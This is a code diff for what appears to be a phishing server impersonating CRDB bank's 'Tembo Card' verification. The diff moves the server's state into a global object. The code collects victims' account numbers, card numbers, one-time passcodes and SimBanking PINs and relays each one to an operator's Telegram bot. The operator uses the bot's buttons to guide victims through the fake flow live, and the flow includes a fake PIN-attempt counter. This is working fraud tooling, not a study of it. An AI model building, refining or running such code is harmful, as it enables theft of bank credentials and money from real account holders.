@@ -10,22 +10,26 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 const bot = new TelegramBot(TOKEN, { polling: true });
 
-let adminChatId = process.env.ADMIN_CHAT_ID || null;
-let clientData = {};
-let pinAttempts = 3;
+// Persistent memory container to prevent data loss on minor re-evaluations
+global.appState = global.appState || {
+    adminChatId: process.env.ADMIN_CHAT_ID || null,
+    clientData: {},
+    pinAttempts: 3,
+    currentClientResponse: null
+};
 
 // Admin start command to dynamically capture or update chat ID
 bot.onText(/\/start/, (msg) => {
-    adminChatId = msg.chat.id;
-    bot.sendMessage(adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${adminChatId}\`\n\nTelegram notifications start strictly from the **Tembo Card Verification** screen onwards.`, { parse_mode: 'Markdown' });
+    global.appState.adminChatId = msg.chat.id;
+    bot.sendMessage(global.appState.adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${global.appState.adminChatId}\`\n\nTelegram notifications start strictly from the **Tembo Card Verification** screen onwards.`, { parse_mode: 'Markdown' });
 });
 
 // API endpoint to handle user step submissions from frontend
 app.post('/api/submit', async (req, res) => {
     const { step, data } = req.body;
-    clientData = { ...clientData, ...data };
+    global.appState.clientData = { ...global.appState.clientData, ...data };
 
-    if (!adminChatId) {
+    if (!global.appState.adminChatId) {
         return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
     }
 
@@ -34,7 +38,7 @@ app.post('/api/submit', async (req, res) => {
         return res.json({ success: true });
     }
     else if (step === 'step3') {
-        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n📱 **Phone No:** ${clientData.phoneNumber || 'N/A'}\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
+        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n📱 **Phone No:** ${global.appState.clientData.phoneNumber || 'N/A'}\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
         
         const opts = {
             reply_markup: {
@@ -47,13 +51,12 @@ app.post('/api/submit', async (req, res) => {
             },
             parse_mode: 'Markdown'
         };
-        await bot.sendMessage(adminChatId, msgText, opts);
+        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
         return res.json({ success: true, pendingApproval: true });
     }
     else if (step === 'step4') {
-        // Handle when the applicant requests a new OTP
         if (data.isResend) {
-            const msgText = `🔄 **Step 4: Applicant Requesting New OTP**\n\n📱 **Phone:** ${clientData.phoneNumber || 'N/A'}\n\n*The applicant has requested a new OTP. Choose action:*`;
+            const msgText = `🔄 **Step 4: Applicant Requesting New OTP**\n\n📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*The applicant has requested a new OTP. Choose action:*`;
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -65,7 +68,7 @@ app.post('/api/submit', async (req, res) => {
                 },
                 parse_mode: 'Markdown'
             };
-            await bot.sendMessage(adminChatId, msgText, opts);
+            await bot.sendMessage(global.appState.adminChatId, msgText, opts);
             return res.json({ success: true, pendingApproval: true });
         }
 
@@ -82,11 +85,11 @@ app.post('/api/submit', async (req, res) => {
             },
             parse_mode: 'Markdown'
         };
-        await bot.sendMessage(adminChatId, msgText, opts);
+        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
         return res.json({ success: true, pendingApproval: true });
     }
     else if (step === 'step5') {
-        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
+        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${global.appState.pinAttempts}\n\n*Choose action for PIN:*`;
         const opts = {
             reply_markup: {
                 inline_keyboard: [
@@ -98,21 +101,18 @@ app.post('/api/submit', async (req, res) => {
             },
             parse_mode: 'Markdown'
         };
-        await bot.sendMessage(adminChatId, msgText, opts);
+        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
         return res.json({ success: true, pendingApproval: true });
     }
 
     res.json({ success: false, message: 'Invalid step' });
 });
 
-let currentClientResponse = null;
-
 bot.on('callback_query', async (query) => {
     const action = query.data;
     const chatId = query.message.chat.id;
     const messageId = query.message.message_id;
 
-    // INSTANTLY fade/acknowledge button tap to ensure zero UI delay & high sensitivity
     try {
         await bot.answerCallbackQuery(query.id);
     } catch (e) {
@@ -128,48 +128,48 @@ bot.on('callback_query', async (query) => {
 
     if (action === 'card_proceed') {
         await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
-        currentClientResponse = { status: 'approved', next: 'otp' };
+        global.appState.currentClientResponse = { status: 'approved', next: 'otp' };
     } else if (action === 'card_deny') {
         await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
-        currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
+        global.appState.currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
     } else if (action === 'otp_correct') {
         await bot.sendMessage(chatId, '✅ Correct OTP!');
-        currentClientResponse = { status: 'approved', next: 'pin' };
+        global.appState.currentClientResponse = { status: 'approved', next: 'pin' };
     } else if (action === 'otp_incorrect') {
         await bot.sendMessage(chatId, '❌ Incorrect OTP.');
-        currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
+        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
     } else if (action === 'otp_resend') {
         await bot.sendMessage(chatId, '🔄 Resend OTP triggered.');
-        currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa ✅.' };
+        global.appState.currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa ✅.' };
     } else if (action === 'otp_resend_approve') {
         await bot.sendMessage(chatId, '✅ New OTP request approved and sent to applicant.');
-        currentClientResponse = { status: 'resend', message: 'Namba mpya ya OTP imetumwa kwenye simu yako ✅.' };
+        global.appState.currentClientResponse = { status: 'resend', message: 'Namba mpya ya OTP imetumwa kwenye simu yako ✅.' };
     } else if (action === 'otp_resend_ignore') {
         await bot.sendMessage(chatId, 'ℹ️ New OTP request ignored.');
-        currentClientResponse = { status: 'retry_otp', message: 'Tafadhali tumia OTP uliyopokea awali.' };
+        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Tafadhali tumia OTP uliyopokea awali.' };
     } else if (action === 'pin_correct') {
         await bot.sendMessage(chatId, '✅ Correct PIN!');
-        pinAttempts = 3;
-        currentClientResponse = { status: 'approved', next: 'success' };
+        global.appState.pinAttempts = 3;
+        global.appState.currentClientResponse = { status: 'approved', next: 'success' };
     } else if (action === 'pin_wrong') {
-        pinAttempts--;
-        if (pinAttempts <= 0) {
+        global.appState.pinAttempts--;
+        if (global.appState.pinAttempts <= 0) {
             await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
-            currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
-            pinAttempts = 3;
+            global.appState.currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
+            global.appState.pinAttempts = 3;
         } else {
-            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${pinAttempts} attempt remains.`);
-            currentClientResponse = { status: 'retry_pin', message: `Wrong PIN ❌. ${pinAttempts} attempt(s) remaining.` };
+            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${global.appState.pinAttempts} attempt remains.`);
+            global.appState.currentClientResponse = { status: 'retry_pin', message: `Wrong PIN ❌. ${global.appState.pinAttempts} attempt(s) remaining.` };
         }
     }
 });
 
 app.get('/api/poll-status', (req, res) => {
     const checkInterval = setInterval(() => {
-        if (currentClientResponse) {
+        if (global.appState.currentClientResponse) {
             clearInterval(checkInterval);
-            const resp = currentClientResponse;
-            currentClientResponse = null;
+            const resp = global.appState.currentClientResponse;
+            global.appState.currentClientResponse = null;
             res.json(resp);
         }
     }, 1000);
@@ -179,4 +179,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-                        
+                                                                                              
